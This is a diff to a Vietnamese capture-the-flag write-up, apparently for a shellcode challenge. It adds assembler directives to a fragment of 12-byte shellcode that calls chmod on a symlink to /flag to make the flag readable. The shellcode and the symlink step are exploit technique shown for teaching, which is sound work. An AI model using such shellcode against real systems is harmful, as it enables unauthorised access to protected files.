@@ -412,7 +412,12 @@ ln -s /flag f
 ```
 
 **Bước 2 (Shellcode - 12 bytes):** Viết shellcode để gọi `chmod("f", 004)`.
-```nasm
+```asm
+.intel_syntax noprefix
+.global _start
+
+_start:
+
 push 0x66       # Ký tự 'f'
 push rsp
 pop rdi         # rdi trỏ tới "f" (Tham số 1)
